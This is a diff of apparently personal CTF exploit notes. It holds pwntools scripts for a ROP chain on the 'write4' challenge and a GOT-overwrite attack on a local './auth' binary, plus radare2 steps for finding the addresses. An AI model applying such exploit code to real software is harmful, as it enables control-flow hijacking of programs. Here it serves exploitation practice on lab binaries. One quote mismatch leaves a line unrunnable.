@@ -23,10 +23,7 @@
 #Last, we need the gadget to put the address of the string into rdi:      0x0000000000400693 : pop rdi ; ret
 
 
-
-#We then everything to build our chain:
-
-
+#We have everything to build our chain:
 
 from pwn import *
 
@@ -54,3 +51,33 @@ rop += p64(print_file)
 e = process('write4')
 e.sendline(rop)
 e.interactive()
+
+
+
+######## example file: 1_GOT ########
+
+#instructions:
+
+#radare2 ./nome_file
+#aaaa
+#afl
+#pdf @ sym.imp.puts //cerca sempre puts 
+
+#segnati l'indirizzo sia di sym.imp.puts che di sym.win
+
+#We have everything to build our chain:
+
+from pwn import *
+
+putsGOT = '0804a00c'
+winAddr = '0804854b'
+
+io = process('./auth’)
+
+io.sendlineafter('?\n', putsGOT)
+io.sendlineafter('\n', winAddr)
+
+io.interactive()
+
+
+             
